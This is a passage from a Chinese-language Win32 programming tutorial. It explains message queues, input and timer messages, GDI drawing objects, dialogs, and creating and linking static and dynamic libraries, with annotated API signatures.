id="分类-3">分类</h4><p>系统消息队列：由系统维护的消息队列。存放系统产生的消息，例如鼠标、键盘等。<br>程序消息队列：属于每一个应用程序（线程）的消息队列。由应用程序（线程）维护。</p><p>根据消息和消息队列之间使用关系，将消息分成两类：</p><ul><li><p>队列消息 – 消息的发送和获取，都是通过消息队列完成。</p><blockquote><p>队列消息-消息发送后，首先放入系统消息队列，之后分发道程序消息队列，然后通过消息循环，从队列当中获取。</p><p><code>GetMessage</code>：从消息队列中获取消息</p><p><code>PostMessage</code>：将消息投递到消息队列</p><p>常见队列消息：<code>WM_PAINT</code>、键盘、鼠标、定时器。</p></blockquote></li><li><p>非队列消息 – 消息的发送和获取，是直接调用消息的窗口处理完成。</p><blockquote><p>非队列消息–消息发送时，首先查找消息接收窗口的窗口处理函数，直接调用处理函数，完成消息。</p><p><code>SendMessage</code>：直接将消息发送给窗口的处理函数，并等候处理结果。常见消息：<code>WM_CREATE</code>、<code>WM_SIZE</code>等。</p></blockquote></li></ul><h3 id="键盘消息">键盘消息</h3><p><code>WM_KEYDOWN</code> ：按键被按下时产生<br><code>WM_KEYUP</code>：按键被放开时产生<br><code>WM_SYSKEYDOWN</code>：系统键按下时产生比如ALT、F10等<br><code>WM_SYSKEYUP</code>：系统键放开时产生</p><p>附带信息:</p><p><code>WPARAM</code>：按键建Virtual Key<br><code>LPARAM</code>：按键的参数，例如按下次数</p><h3 id="鼠标消息">鼠标消息</h3><p>基本鼠标消息：</p><p><code>WM_LBUTTONDOWN</code>：鼠标左键按下<br><code>WM_LBUTTONUP</code>：鼠标左键抬起<br><code>WM_RBUTTONDOWN</code>：鼠标右键按下<br><code>WM_RBUTTONUP</code>：鼠标右键抬起<br><code>WM_MOUSEMOVE</code>：鼠标移动消息</p><p>双击消息：</p><p><code>WM_LBUTTONDBLCLK</code>：鼠标左键双击<br><code>WM_RBUTTONDBLCLK</code>：鼠标右键双击</p><p>滚轮消息：</p><p><code>WM_MOUSEWHEEL</code>：鼠标滚轮消息</p><blockquote><p>一般滚轮的位移量为<code>120</code>的倍数 ( 正负均可 )</p></blockquote><p>附带信息∶</p><p><code>wPARAM</code>：其他按键的状态，例如Ctrl/Shift等<br><code>lPARAM</code>：鼠标的位置，窗口客户区坐标系。<br><code>LOWORD</code>：X 坐标位置<br><code>HIWORD</code>：Y 坐标位置</p><p>一般情况鼠标按下/抬起成对出现。在鼠标移动过程中，会根据移动速度产生一列的WM_MOUSEMOVE消息。同时使用双击消息处理时需要在注册窗口类的时候添加<code>CS_CBLCLKS</code>风格。</p><h3 id="定时器消息">定时器消息</h3><p>定时器一般用于周期性执行的操作</p><p>产生时间</p><p>在程序中创建定时器，当到达时间间隔时，<code>GetMessage</code>会向程序发送一个<code>WM_TIMER</code>消息。定时器的精度是毫秒，但是准确度很低。例如设置时间间隔为1000ms，但是会在非1000毫秒到达消息。</p><blockquote><p>误差在毫秒级</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">UINT_PTR <span class="hljs-title">SetTimer</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//定时器窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT_PTR nIDEvent,<span class="hljs-comment">//定时器ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT uElapse,<span class="hljs-comment">//时间间隔(毫秒)</span></span></span><br><span class="hljs-params"><span class="hljs-function">TIMERPROC IpTimerFunc<span class="hljs-comment">//定时器处理函数指针(不使用则设置为NULL)</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span><span class="hljs-comment">//创建成功返回非零值</span></span><br></code></pre></td></tr></table></figure><blockquote><p>定时器的创建</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">UINT_PTR <span class="hljs-title">KillTimer</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//定时器窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT_PTR nIDEvent,<span class="hljs-comment">//定时器ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>销毁定时器</p></blockquote><p>附带信息</p><p><code>wPARAM</code>：定时器ID，用于区分时间到后是哪个定时器触发的<br><code>lPARAM</code>：定时器处理函数的指针</p><h2 id="绘图">绘图</h2><p>绘图设备DC ( Device Context ) ，也称之为绘图上下文或绘图描述表</p><p>HDC - DC句柄，表示绘图设备</p><p>GDI - Windows graphics device interface ( Win32提供的绘图API )</p><h3 id="颜色">颜色</h3><p>计算机使用红、绿、蓝，R -  <code>0 ～ 255</code>、G  -  <code>0 ～ 255</code>、B  -  <code>0 ～ 255</code><br>每一个点颜色是 3 个字节 24 位保存<code>0 - 2^24 - 1</code>，可以保存任意的颜色<br>16位：5，5，6  ( RGB )<br>32位：8，8，8，8  绘图或透明度 ( RGB+透明度 )</p><h3 id="颜色的使用">颜色的使用</h3><p><code>COLORREF</code>：实际DWORD ( unsigned long )<br>例如：<code>COLORREF nColor = 0;</code></p><p>赋值使用RGB宏</p><p>例如: <code>nColor = RGB(0,0，255);</code></p><p>获取RGB值</p><p><code>GetRValue/GetGValue/GetBValue</code><br>例如：<code>BYTE nRed = GetRValue( nColor );</code>返回对应颜色的配比是多少</p><h3 id="基本图形绘制">基本图形绘制</h3><p><code>SetPixel</code>设置指定点的颜色 ( 画一个点 )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">COLORREF <span class="hljs-title">SetPixel</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdc,<span class="hljs-comment">//DC句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> X,<span class="hljs-comment">//X坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> Y,<span class="hljs-comment">//Y坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function">COLORREF crColor<span class="hljs-comment">//设置的颜色</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回点原来的颜色</span><br></code></pre></td></tr></table></figure><p>线的使用(直线、弧线)</p><p><code>MoveToEx</code>：指到窗口到目标点(从<code>(0,0)</code>到指定的点)，设置当前点<br><code>LineTo</code>：从窗口当前点到指定点绘制一条直线<br>当前点：上一次绘图时的最后一点，初始为<code>(0,0)</code>点。<br>封闭图形：能够用画刷填充的图形<code>Rectangle</code> ( 绘画直角矩形 ) / <code>Ellipse</code> ( 圆形 )</p><h3 id="GDI-绘图对象">GDI 绘图对象</h3><h4 id="画笔">画笔</h4><p>画笔的作用</p><p>线的颜色、线型、线粗。<br><code>HPEN</code>：画笔句柄</p><p>画笔的创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HPEN <span class="hljs-title">CreatePen</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> fnPenStyle,<span class="hljs-comment">//画笔的样式</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidth,<span class="hljs-comment">//画笔的粗细</span></span></span><br><span class="hljs-params"><span class="hljs-function">COLORREF crColor<span class="hljs-comment">//画笔的颜色</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//创建成功返回句柄</span><br></code></pre></td></tr></table></figure><p><code>PS_SOILD</code>：实心线，可以支持多个像素宽其他线型只能是一个像素宽。</p><blockquote><p>虚线画笔像素宽只能是 1，实心画笔可以是任意像素宽</p></blockquote><p>将画笔应用到DC中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HGDIOBJ <span class="hljs-title">SelectObject</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdc,<span class="hljs-comment">//绘图设备句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">HGDIOBJ hgdiobj<span class="hljs-comment">//GDI绘图对象句柄，画笔句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回原来的GDI绘图对象句柄</span><br></code></pre></td></tr></table></figure><blockquote><p>注意保存原来 DC 当中的画笔 ( 返回值 )，DC 使用完我们创建的画笔需要将其还回原来的画笔( 黑色 )</p></blockquote><p>将原来的画笔，使用<code>SelectObject</code>函数 ( 类似于交换 )，放入到设备DC中，就会将我们创建的画笔取出</p><p>释放画笔 ( 我们自己创建的画笔 )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">DeleteObject</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HGDIOBJ hObject <span class="hljs-comment">//GDI绘图对象句柄，画笔句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>只能删除不被 DC 使用的画笔，所以在释放前，必须将画笔从DC中取出。</p></blockquote><h4 id="画刷">画刷</h4><p>画刷-封闭图形的填充的颜色、图案<br>HBRUSH - 画刷句柄</p><p><code>CreateSolidBrush</code>：创建实心画刷 ( 填充单一颜色 )<br><code>CreateHatchBrush</code>：创建纹理画刷 ( 填充纹理线 )</p><p>之后同画笔一样，需要进行交换<code>(SelectObject)</code>和对创建的画刷句柄进行消除。</p><blockquote><p>初始画刷为白颜色，同时用直线围起来的图形即使封闭也不是封闭图形</p><p>可以使用<code>GetStockObject</code>函数获取系统维护的画刷、画笔等。调用的系统画刷不需要销毁，也无法使用<code>DeleteObject</code>进行销毁掉。</p><p>如果不使用画刷填充，需要使用<code>NULL_BRUSH</code>参数，获取不填充的画刷。<code>GetStockObject</code>返回的画刷不需要<code>DeleteObject</code>。</p></blockquote><h3 id="位图">位图</h3><p>光栅图形 – 记录图像中每一点的颜色等信息。<br>矢量图形 – 记录图像算法、绘图指令等。<br>HBITMAP - 位图句柄</p><p>位图的使用</p><ul><li>在资源中添加位图资源</li><li>从资源中加载位图<code>LoadBitmap</code></li><li>创建一个与当前DC相匹配的DC ( 内存 DC )</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HDC <span class="hljs-title">CreateCompatibleDC</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdc <span class="hljs-comment">//当前DC句柄，可以为NULL(使用屏幕DC)</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回创建好的DC句柄</span><br></code></pre></td></tr></table></figure><ul><li>将位图放入匹配的DC中SelectObject</li><li>成像( 1:1 )</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">BitBlt</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdcDest,<span class="hljs-comment">//目的DC</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nXDest,<span class="hljs-comment">//目的左上X坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nYDest,<span class="hljs-comment">//目的左上Y坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidth,<span class="hljs-comment">//目的宽度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nHeight,<span class="hljs-comment">//目的高度</span></span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdcSrc,<span class="hljs-comment">//源DC</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nXSrc，<span class="hljs-comment">//源左上X坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nYSrc,<span class="hljs-comment">//源左上Y坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwRop <span class="hljs-comment">//成像方法  SRCCOPY (原样成像)</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>缩放成像</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">StretchBlt</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdcDest,<span class="hljs-comment">// handle to destination DC</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nXOriginDest,<span class="hljs-comment">// x-coord of destination upper-left corner</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nYOriginDest,<span class="hljs-comment">// y-coord of destination upper-left corner</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidthDest,<span class="hljs-comment">// width of destination rectangle</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nHeightDest,<span class="hljs-comment">// height of destination rectangle</span></span></span><br><span class="hljs-params"><span class="hljs-function">HDC hdcSrc,<span class="hljs-comment">// handle to source DC</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nXOriginSrc，<span class="hljs-comment">// x-coord of source upper-left corner</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nYOriginSrc,<span class="hljs-comment">// y-coord of source upper-left corner</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidthSrc,<span class="hljs-comment">//源DC宽</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nHeightSrc,<span class="hljs-comment">//源DC高</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwRop<span class="hljs-comment">// raster operation code</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure></blockquote><ul><li><p>取出位图 <code>( SelectObject )</code></p></li><li><p>释放位图 <code>( DelectObject )</code></p></li><li><p>释放匹配的 DC <code>(DeleteObject)</code></p></li></ul><h3 id="文字的绘制">文字的绘制</h3><p><code>TextOut</code>：将文字绘制在指定坐标位置 ( 只能绘制单行 )</p><p><code>DrawText</code>：可以绘制矩形框的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">DrawText</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HDC hDC,<span class="hljs-comment">//DC句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpString,<span class="hljs-comment">//字符串</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCount,<span class="hljs-comment">//字符数量</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPRECT lpRect,<span class="hljs-comment">//绘制文字的矩形框</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT uFormat<span class="hljs-comment">//绘制的方式</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>文字颜色和背景</p><p>文字颜色:：<code>SetTextColor</code><br>文字背景色：<code>SetBkColor</code> 只适用于不透明模式下<br>文字背景模式：<code>SetBkMode</code> (OPAQUE 不透明模式 / TRANSPARENT 透明模式)</p><p>字体</p><p><code>Windows</code>常用的字体为<code>TrueType</code>格式的字体文件</p><p>创建字体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HFONT <span class="hljs-title">CreateFont</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nHeight,<span class="hljs-comment">//字体高度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nWidth,<span class="hljs-comment">//字体宽度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nEscapement,<span class="hljs-comment">//字符串倾斜角度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nOrientation,<span class="hljs-comment">//字符旋转角度</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> fnWeight,<span class="hljs-comment">//字体的粗细</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwltalic,<span class="hljs-comment">//斜体 0：不为斜体  1：斜体</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwUnderline,<span class="hljs-comment">//字符下划线</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwStrikeOut,<span class="hljs-comment">//删除线</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwCharSet,<span class="hljs-comment">//字符集 GB312</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwOutputPrecision,<span class="hljs-comment">//输出精度 (已废弃，赋值为 0 即可)</span></span></span><br><span class="hljs-params"><span class="hljs-function">DwORD fdwClipPrecision,<span class="hljs-comment">//剪切精度 (已废弃，赋值为 0 即可)</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwQuality,<span class="hljs-comment">//输出质量 (已废弃，赋值为 0 即可)</span></span></span><br><span class="hljs-params"><span class="hljs-function">DWORD fdwPitchAndFamily,<span class="hljs-comment">//匹配字体</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpszFace <span class="hljs-comment">//字体名称</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><h2 id="对话框">对话框</h2><h3 id="对话框的分类">对话框的分类</h3><p>模式对话框–当对话框显示时，会禁止其他窗口和用户交互操作。<br>无模式对话框–在对话框显示后，其他窗口仍然可以和用户交互操作。</p><h3 id="对话框基本使用">对话框基本使用</h3><ol><li>对话框窗口处理函数</li><li>注册窗口类（不使用)</li><li>创建对话框</li><li>对话框的关闭</li></ol><h3 id="对话框窗口处理函数">对话框窗口处理函数</h3><blockquote><p>并非真正的对话框窗口处理函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">INT CALLBACK <span class="hljs-title">DialogProc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hwndDlg，<span class="hljs-comment">//窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT uMsg,<span class="hljs-comment">//消息ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,<span class="hljs-comment">//消息参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lParam <span class="hljs-comment">//消息参数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>返回<code>TRUE</code>：缺省处理函数不需要处理。<br>返回<code>FALSE</code>：交给缺省处理函数处理。<br>不需要调用缺省对话框窗口处理函数。</p><h3 id="创建对话框">创建对话框</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">INT <span class="hljs-title">DialogBox</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">//应用程序实例句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpTemplate,<span class="hljs-comment">//对话框资源ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWndParent,<span class="hljs-comment">//对话框父窗口</span></span></span><br><span class="hljs-params"><span class="hljs-function">DLGPROC lpDialogFunc<span class="hljs-comment">//自定义函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>DialogBox</code>是一个阻塞函数，只有当对话框关闭后，才会返回，继续执行后续代码。</p><p>返回值是通过<code>EndDialog</code>设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HWND <span class="hljs-title">CreateDialog</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">//应用程序实例句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpTemplate,<span class="hljs-comment">//对话框资源ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWndParent,<span class="hljs-comment">//对话框父窗口</span></span></span><br><span class="hljs-params"><span class="hljs-function">DLGPROC lpDialogFunc<span class="hljs-comment">//自定义函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>非阻塞函数，创建成功返回窗口句柄，需要使用<code>ShowWindow</code>函数显示对话框</p><p>关闭时使用<code>DestroyWindow</code>销毁窗口，不能使用<code>EndDialog</code>关闭对话框。</p><h3 id="对话框的关闭">对话框的关闭</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">EndDialog</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hDlg,<span class="hljs-comment">//关闭的对话框窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">INT_PTR nResult,<span class="hljs-comment">//关闭的返回值</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>关闭模式对话框，只能使用<code>EndDialog</code>，不能使用<code>DestroyWindow</code>等函数。<code>nResult</code>是<code>DialogBox</code>函数退出时的返回值。</p><p>关闭非模式对话框，关闭时使用<code>DestroyWindow</code>销毁窗口，不能使用<code>EndDialog</code>关闭对话框。</p><h3 id="对话框的消息">对话框的消息</h3><p><code>WM_INITDIALOG</code>：对话框创建之后显示之前，通知对话框窗口处理函数，可以完成自己的初始化相关的操作。</p><h2 id="静态库">静态库</h2><h3 id="特点">特点</h3><p>运行不存在，静态库源码被链接到调用程序中，目标程序的归档。</p><blockquote><p><code>C</code>在<code>Windows</code>下直接编译不连接不需要对函数进行声明即可调用，但是<code>C++</code>需要对函数进行申明</p></blockquote><h3 id="C-静态库的使用">C 静态库的使用</h3><p>库路径设置:可以使用<code>pragma</code>关键字设置<code>#pragma comment( lib，&quot;../lib/clib.lib”)</code></p><h3 id="C-静态库的创建">C++ 静态库的创建</h3><ol><li>创建一个静态库项目。</li><li>添加库程序，源文件使用CPP文件。</li></ol><h3 id="C-静态库的使用-2">C++静态库的使用</h3><p>库路径设置：可以使用<code>pragma</code>关键字设置<code>#pragma comment( lib,&quot;../lib/cpplib.lib”)</code></p><blockquote><p><code>C++</code>在处理函数时会对函数进行换名，因此在<code>C++</code>中调用<code>C</code>静态库会找不到，而无法使用</p><p>可以在调用的<code>C</code>静态库的函数声明前加一个<code>extern &quot;C&quot;</code></p></blockquote><h2 id="动态库">动态库</h2><h3 id="特点-2">特点</h3><ol><li>运行时独立存在</li><li>源码不会链接到执行程序</li><li>使用时加载(使用动态库必须使动态库执行)</li></ol><p>与静态库的比较︰</p><p>由于静态库是将代码嵌入到使用程序中，多个程序使用时，会有多份代码，所以代码体积会增大。动态库的代码只需要存在一份，其他程序通过函数地址使用，所以代码体积小。<br>静态库发生变化后，新的代码需要重新链接嵌入到执行程序中。动态库发生变化后，如果库中函数的定义（或地址)未变化，其他使用<code>DLL</code>的程序不需重新链接。</p><h3 id="创建动态库项目">创建动态库项目</h3><p>添加库程序</p><p>库程序导出–提供给使用者库中的函数等信息。</p><ol><li>声明导出︰使用<code>_declspec(dllexport)</code>导出函数，用该方法导出的函数名字会被替换 ( C++ )</li></ol><blockquote><p>注意：动态库编译链接后，也会有<code>lib</code>文件，是作为动态库函数映射使用，与静态库不完全相同。</p></blockquote><ol start="2"><li>模块定义文件.def</li></ol><p>例如</p><p><code>LIBRARY DLLFunc //库</code><br><code>EXPORTS //库导出表</code><br><code>DLL_Mul@1 //导出的函数</code></p><blockquote><p><code>dll</code>文件中将函数导出后会将定义的函数的地址放在文件头，之后放定义函数的源码</p></blockquote><h3 id="动态库的使用">动态库的使用</h3><p><strong>隐式链接</strong>(操作系统负责使动态库执行)</p><ol><li>头文件和函数原型</li></ol><p>​可以在函数原型的声明前，增加<code>_declspec(dllimport))</code></p><ol start="2"><li>导入动态库的LIB文件</li><li>在程序中使用函数</li><li>隐式链接的情况，dll文件可以存放的路径︰<ol><li>与执行文件中同一个目录下</li><li>当前工作目录</li><li>Windows 目录</li><li>Windows / System32 目录</li><li>Windows / System</li><li>环境变量<code>PATH</code>指定目录</li></ol></li></ol><blockquote><p>程序通过定位到<code>lib</code>文件之后取其中的编号，而对引用的函数进行加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_declspec(dllimport) XXX <span class="hljs-comment">//定义的函数申明 ( C++ )</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib,<span class="hljs-meta-string">&quot;lib文件路径&quot;</span>)</span><br></code></pre></td></tr></table></figure></blockquote><p><strong>显示链接</strong>(程序员自己负责使动态库执行)</p><ol><li><p>定义函数指针类型typedef</p></li><li><p>加载动态库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HMODULE <span class="hljs-title">LoadLibrary</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpFileName <span class="hljs-comment">//动态库文件名或全路径</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回DLL的实例句柄 (HINSTANCE)</span><br></code></pre></td></tr></table></figure></li><li><p>获取函数地址 ( 绝对 / 真实地址 )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">FARPROC <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule,<span class="hljs-comment">//DLL句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCSTR lpProcName <span class="hljs-comment">//函数名称</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//成功返回函数地址</span><br></code></pre></td></tr></table></figure></li><li><p>使用函数</p></li><li><p>卸载动态库</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">FreeLibrary</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HMODULE hModule <span class="hljs-comment">//DLL的实例句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>如果出现加载的函数的地址为 0 的情况，可以在<code>dll</code>项目的文件中加入一个文件头，包含以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 